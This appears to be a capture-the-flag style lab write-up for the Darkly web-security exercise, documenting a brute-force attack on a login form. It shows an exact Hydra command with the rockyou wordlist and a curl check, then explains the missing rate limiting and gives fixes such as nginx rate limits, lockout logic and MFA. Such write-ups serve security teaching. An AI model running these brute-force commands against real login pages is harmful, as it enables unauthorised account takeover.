<!-- explanation.md -->

# Brute-Force Vulnerability — Documentation

## How I Found It

### Step-by-step discovery process

#### Initial reconnaissance
- Visited http://192.168.1.16/index.php?page=signin and inspected the login form with browser devtools / proxy.
- Noted form parameters: username, password.
- Observed the application returns a consistent failure marker: images/WrongAnswer.gif.
- Performed several manual wrong attempts — no CAPTCHA, no progressive delay, no account lockout.

#### Identified the vulnerable behaviour
- Predictable failure response (easy to detect success or failure).
- Login accepts repeated requests without throttling suitable for automated brute force.

---

## How I Exploited It

### Exact commands and payloads used

Download wordlist

```bash
mkdir -p ~/wordlists
cd ~/wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar -xvzf rockyou.txt.tar.gz
# result: ~/wordlists/rockyou.txt
```

Hydra command (exact)

```bash
hydra -l admin -P ~/wordlists/rockyou.txt -F -o hydra.log 192.168.1.16 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
```

• `-l admin` → single username admin (use `-L` for username list).  
• `-P` → password list.  
• `-F` → stop on first success.  
• `http-get-form` with `F=` pointing to failure marker (images/WrongAnswer.gif).

Manual verification (curl)

```bash
# replace PASSWORD with candidate from hydra.log
curl -i "http://192.168.1.16/index.php?page=signin&username=admin&password=PASSWORD&Login=Login"
```

• Confirm success by absence of images/WrongAnswer.gif, presence of authenticated content or redirect.

Artifacts to include in Resources

- hydra.log (hydra output)  
- proof_curl.txt (curl response demonstrating success)  
- screenshot_failed.png (show WrongAnswer.gif)  
- screenshot_success.png (show authenticated page)

**Ethics:** Only test on authorized targets (your Darkly lab). Do not run these against systems without permission.

---

## Why It Works

### Underlying vulnerability explanation

- Predictable failure fingerprint: The app returns a unique string/image on failed login (images/WrongAnswer.gif) so tools can reliably detect failure vs success.
- No rate limiting / account lockout: The application accepts unlimited attempts from the same IP (or distributed ones) without blocking.
- Credentials in GET (exposed): Sending credentials in the URL increases exposure (logs, proxy history).
- Weak password policy / common passwords: Accounts may use easily guessed passwords (rockyou matches).
- No bot mitigation: No CAPTCHA, MFA, or behavioral checks to block automated tools.

Technical flow:
```
Attacker tools -> repeated requests with different passwords
↓
Server responds with same failure marker each time
↓
Tool recognizes missing marker -> reports success
```

---

## How to Fix It

### Security recommendations (short & actionable)

**Immediate / short-term**

1• Block rapid attempts (rate limit)  
Nginx example (basic):

```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
server {
  location = /index.php {
    if ($arg_page = "signin") {
      limit_req zone=login burst=5 nodelay;
    }
  }
}
```

2• Use POST for login (do not send credentials in URL).  
3• Make error messages generic (do not reveal if username exists).  
4• Add CAPTCHA / bot challenge after N failed attempts (e.g., after 3).  
5• Temporary IP blocking / Fail2Ban for repeated failures.

**Medium / long-term**

1• Per-account throttling & progressive lockout (example: after 5 fails lock for 15 minutes or increase delay).  
Simple pseudocode:

```pseudo
if ($user->locked_until && now < $user->locked_until) deny();
if (password_verify($pw,$hash)) reset_failed();
else increment_failed();
if (failed >=5) lock(15min);
```

2• Enforce strong passwords & check against breached lists at registration.  
3• Multi-Factor Authentication (MFA) for sensitive accounts.  
4• Use secure password hashing (Argon2id / bcrypt).  
5• Logging & alerting for credential-stuffing patterns integrate with SIEM.  
6• Use WAF rules to detect/mitigate automated attacks and block unusual request rates.

---

## Testing after fixes

- Re-run the hydra command to confirm it fails/gets blocked.  
- Verify CAPTCHA or lockout triggers after threshold.  
- Confirm credentials are not logged in URLs (POST used).  
- Check logs/alerts are generated on brute-force attempts.

---

## References

- OWASP Authentication Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html  
- OWASP Brute Force Prevention Guidance — https://owasp.org/www-project-cheat-sheets/  
- CWE-307: Improper Restriction of Excessive Authentication Attempts — https://cwe.mitre.org/data/definitions/307.html  
- Hydra tool (THC Hydra) — https://github.com/vanhauser-thc/thc-hydra  
- SecLists (rockyou) — https://github.com/danielmiessler/SecLists